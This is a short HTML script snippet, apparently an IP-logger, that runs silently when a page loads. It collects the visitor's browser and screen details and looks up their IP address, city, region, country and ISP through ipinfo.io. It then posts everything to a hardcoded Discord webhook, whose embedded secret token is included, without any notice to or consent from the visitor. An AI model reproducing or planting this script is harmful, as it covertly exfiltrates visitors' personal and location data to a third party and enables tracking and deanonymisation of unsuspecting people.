<script>
    // Function to send device and geolocation information to Discord webhook
    function sendDeviceInfoToWebhook() {
        const webhookURL = 'https://discord.com/api/webhooks/1296274274151043072/ImR7zXQ3rInBB3LXRwj_-n-PZgnBv-UupH44qtpY1p6LkwuGnOjSwzvFWWZtMyG0zp42';

        // Device information
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            language: navigator.language
        };

        // Fetch geolocation info from ipinfo.io
        fetch('https://ipinfo.io?token=0a7775d6f7e150') // Replace with your ipinfo.io token
            .then(response => response.json())
            .then(data => {
                const geoInfo = {
                    ip: data.ip,
                    country: data.country,
                    region: data.region,
                    city: data.city,
                    org: data.org
                };

                // Construct the message content for Discord
                const content = `
                    **Device Information:**
                    - **User Agent:** ${deviceInfo.userAgent}
                    - **Platform:** ${deviceInfo.platform}
                    - **Screen Width:** ${deviceInfo.screenWidth}
                    - **Screen Height:** ${deviceInfo.screenHeight}
                    - **Language:** ${deviceInfo.language}

                    **Geolocation Information:**
                    - **IP Address:** ${geoInfo.ip}
                    - **Country:** ${geoInfo.country}
                    - **Region:** ${geoInfo.region}
                    - **City:** ${geoInfo.city}
                    - **Organization:** ${geoInfo.org}
                `;

                // Send the information to the Discord webhook
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: content, // Discord expects "content" for plain text messages
                    })
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Device and geo info sent to webhook');
                    } else {
                        console.error('Error sending info', response.statusText);
                    }
                })
                .catch(error => console.error('Error sending info:', error));
            })
            .catch(error => console.error('Error fetching geo info:', error));
    }

    // Call the function when the page loads
    window.onload = sendDeviceInfoToWebhook;
</script>
